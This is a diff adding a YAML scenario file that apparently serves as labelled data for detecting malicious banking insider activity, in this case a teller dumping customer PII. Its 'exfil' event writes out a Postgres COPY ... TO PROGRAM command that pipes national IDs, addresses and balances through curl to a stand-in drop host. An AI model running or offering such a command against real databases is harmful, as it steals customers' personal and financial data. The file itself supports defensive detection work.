@@ -1,0 +1,22 @@
+scenario_id: banking_teller_pii_dump_0008
+family_id: banking_teller_pii_dump_0008
+domain: banking
+time_of_day: '12:30'
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: pii_dump
+  role: teller
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.284659367822694
+  events:
+  - sql: SELECT national_id, address, full_name FROM customers WHERE branch_id != 'BR-027'
+  - step_id: exfil
+    sql: COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'
+    connects_to:
+      ip: 104.244.72.115
+      port: 8080
